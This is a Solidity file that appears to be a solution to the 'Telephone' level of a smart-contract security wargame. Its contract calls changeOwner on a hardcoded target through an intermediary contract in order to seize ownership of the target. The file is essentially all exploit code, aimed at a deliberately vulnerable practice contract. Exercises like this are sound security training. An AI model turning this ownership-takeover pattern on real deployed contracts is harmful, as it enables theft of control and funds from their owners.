// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel04.sol";

contract Tele {
    Telephone level4 = Telephone(0x3d3F549676B9812D256F63C96b4b80FE06522736);

    function exploit() external {
        level4.changeOwner(0xB63bF09362065C621E3552D646F938662911f33a);
    }
}
